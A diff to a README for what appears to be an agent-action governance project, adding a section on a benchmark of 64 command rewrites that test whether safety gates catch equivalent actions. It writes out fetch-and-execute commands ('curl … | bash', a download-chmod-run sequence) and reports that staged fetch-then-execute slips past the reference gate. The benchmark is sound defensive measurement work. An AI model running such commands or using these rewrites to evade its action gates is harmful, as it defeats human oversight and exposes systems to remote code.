@@ -53,7 +53,7 @@ examples/            coding, invoice, literature, and marketing policies
 tests/               executable contract tests
 docs/                OpenSharing, MCP, problem, and threat-model notes
 paper/               the measurement study behind the profile
-research/            script to reproduce that study
+research/            reproduction script and the governance benchmark
 ```
 
 ## Quick Start
@@ -190,6 +190,29 @@ On the 3,339-skill holdout split this takes a few minutes and prints the
 count with a per-class breakdown, writing the skills themselves to
 `clawhub_reproduction.csv`. Pass `--split train` for the full 66,192-skill
 corpus, which is where the 822 figure comes from.
+
+## The benchmark
+
+An implementation that resolves `curl … | bash` may still miss
+`curl -o s URL; chmod +x s; ./s`, which does the same thing. Until the field can
+state how much of an action's equivalence class a gate covers, no two gates can be
+compared and no implementation can show it is improving.
+
+`research/evasion_bench.py` is 64 semantics-preserving rewrites across nine
+techniques. Each rewrites a base action whose consequence class is not in dispute, so
+a miss needs no judgement call. Run it against any implementation:
+
+```bash
+pip install pheo-oats requests
+oats start --no-browser &
+python research/evasion_bench.py
+```
+
+The reference implementation resolves **77%**. The per-technique breakdown is the
+useful part: wrapping and chaining resolve completely, staged fetch-then-execute
+resolves at zero, because no single command in it is remote execution. Adding a
+technique is a function returning command strings, and new techniques are more
+valuable than tuning against the existing ones.
 
 ## Implementations
 
